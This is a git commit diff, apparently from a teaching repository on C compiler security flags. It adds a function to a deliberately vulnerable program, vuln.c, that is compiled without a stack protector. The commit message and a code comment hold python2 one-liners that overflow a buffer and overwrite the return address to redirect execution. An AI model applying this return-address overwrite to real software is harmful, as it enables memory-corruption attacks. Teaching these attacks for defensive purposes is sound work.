ce2df5239fe399d081629fe14886e435837eb43f
Victor Rodriguez <victor.rodriguez.bahena@intel.com>
2020-06-19 17:33:37 -0500

    Multiplication example
    python2 -c 'import struct; print "l"*32+struct.pack("iiii",0x08049db5,0,2,3)' | ./vuln
    
    Signed-off-by: Victor Rodriguez <victor.rodriguez.bahena@intel.com>

--- c_programing_exercises/cflags_security/vuln.c
+++ c_programing_exercises/cflags_security/vuln.c
@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdlib.h>
+
 /*
  * IMPORTANT: To compile 32 bit binaries on 64 bit Linux version, you have to
  * Install libx32gcc development package and 32 bit GNU C Library
@@ -6,6 +8,12 @@
  * gcc -m32 -O0 vuln.c -o vuln -fno-stack-protector --static -fno-pic
  * python2 -c 'import struct; print "l"*32+struct.pack("i",0x08049db5)' | ./vuln
  */
+
+void secretFunction_mul(int a, int b)
+{
+      printf("The answer is %d\n", a*b);
+      exit(0);
+}
 
 void secretFunction()
 {
